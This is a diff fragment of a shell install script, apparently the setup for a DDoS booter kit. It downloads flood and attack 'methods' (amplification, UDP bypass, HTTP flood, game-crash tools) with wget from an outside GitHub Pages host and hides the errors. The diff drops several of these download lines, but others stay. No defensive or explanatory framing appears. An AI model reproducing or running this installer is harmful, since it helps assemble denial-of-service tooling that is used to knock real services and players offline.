@@ -75,17 +75,8 @@ else
     
     wget https://haker20szs.github.io/haker20szs/methods/OVH-AMP -O ~/root/methods/OVH-AMP 2> /dev/null
     wget https://haker20szs.github.io/haker20szs/methods/OVH-FLIDR -O ~/root/methods/OVH-FLIDR 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/fli.py -O ~/root/methods/fli.py 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/home.pl -O ~/root/methods/home.pl 2> /dev/null
     wget https://haker20szs.github.io/haker20szs/methods/GAME-CRASH -O ~/root/methods/GAME-CRASH 2> /dev/null
     wget https://haker20szs.github.io/haker20szs/methods/MertOVH -O ~/root/methods/MertOVH 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/stress -O ~/root/methods/stress 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/god.pl -O ~/root/methods/god.pl 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/AMP.pl -O ~/root/methods/AMP.pl 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/udp-bypass -O ~/root/methods/udp-bypass 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/udp-bypass-v2 -O ~/root/methods/udp-bypass-v2 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/HTTP-RAW.js -O ~/root/methods/HTTP-RAW.js 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/HTTP-FLOOD.js -O ~/root/methods/HTTP-FLOOD.js 2> /dev/null
 
     echo "Installing modules."
 
